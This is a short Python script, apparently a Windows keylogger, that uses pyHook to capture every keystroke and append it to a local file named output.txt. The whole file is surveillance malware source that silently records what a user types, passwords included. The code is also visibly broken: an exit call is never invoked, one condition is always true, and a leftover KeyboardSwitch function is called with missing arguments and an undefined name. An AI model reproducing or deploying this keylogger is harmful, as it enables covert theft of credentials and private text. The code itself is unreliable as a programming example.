import pythoncom, pyHook, sys

def OnKeyboardEvent(event):
    if event.Ascii==5:
        sys.exit

    elif event.Ascii !=0 or 8:
        f = open('output.txt', 'r+')
        buffer = f.read()
        f.close()
        f = open ('output.txt', 'w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs = ('\n')
        buffer +=(keylogs)
        f.write(buffer)
        f.close()
        

# return True to pass the event to other handlers
    return True

# create a hook manager
hm = pyHook.HookManager()
# watch for all mouse events
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()

def KeyboardSwitch(self, msg='??', vk_code='??', scan_code='??', ascii='??', flags='??', time='??', hwnd='??', window_name='??'):

    event = KeyboardEvent(msg, vk_code, scan_code, ascii, flags, time, hwnd, win_name)

    func = self.keyboard_funcs.get(msg)

    if func:

      return func(event)

    else:

      return True

KeyboardSwitch()
